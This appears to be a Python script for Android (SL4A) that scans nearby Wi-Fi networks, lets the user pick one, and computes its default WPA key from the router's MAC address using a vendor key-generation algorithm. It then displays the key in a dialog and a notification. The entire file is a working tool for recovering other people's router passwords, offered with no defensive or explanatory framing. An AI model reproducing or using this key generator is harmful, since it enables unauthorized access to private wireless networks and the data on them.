import android

import time



droid = android.Android()




def keygen( mac ):

    bytes = [int(x, 16) for x in mac.split(':')]

    c1 = (bytes[-2] << 8) + bytes[-1]

    (s6, s7, s8, s9, s10) = [int(x) for x in '%05d' % (c1)]

    (m7, m8, m9, m10, m11, m12) = [int(x, 16) for x in mac.replace(':', '')[6:]]

    k1 = (s7 + s8 + m11 + m12) & (0x0F)

    k2 = (m9 + m10 + s9 + s10) & (0x0F)


    x1 = k1 ^ s10

    x2 = k1 ^ s9

    x3 = k1 ^ s8

    y1 = k2 ^ m10

    y2 = k2 ^ m11

    y3 = k2 ^ m12

    z1 = m11 ^ s10

    z2 = m12 ^ s9

    z3 = k1 ^ k2


    return "%X%X%X%X%X%X%X%X%X" % (x1, y1, z1, x2, y2, z2, x3, y3, z3)



bssid = []

ssid  = []




if droid.checkWifiState().result == False:

    droid.toggleWifiState()

    droid.dialogCreateSpinnerProgress('','enabling wifi')

    droid.dialogShow()

    time.sleep(2)

    droid.dialogDismiss()




droid.wifiStartScan()




if droid.wifiGetScanResults().result is not None and droid.wifiGetScanResults().result != []:

    for wifi in droid.wifiGetScanResults().result:

        bssid.append(wifi['bssid'])

        ssid.append(wifi['ssid'])



    droid.dialogCreateAlert('Select from list:')

    droid.dialogSetItems(ssid)

    droid.dialogSetNegativeButtonText('Cancel')

    droid.dialogShow()



    if 'item' in droid.dialogGetResponse().result:

        selItem = droid.dialogGetResponse().result['item']

        selBSSID = bssid[selItem]

        selSSID = ssid[selItem]


        key = keygen(selBSSID)



        droid.dialogCreateAlert('', 'Key:\t' + key + '\nMAC:\t' + selBSSID + '\nName:\t' + selSSID)
        droid.dialogSetPositiveButtonText('Ok')
        droid.dialogShow()
        droid.notify(selSSID, key)

else:
    droid.makeToast('can not find wifi or unable to activate wifi')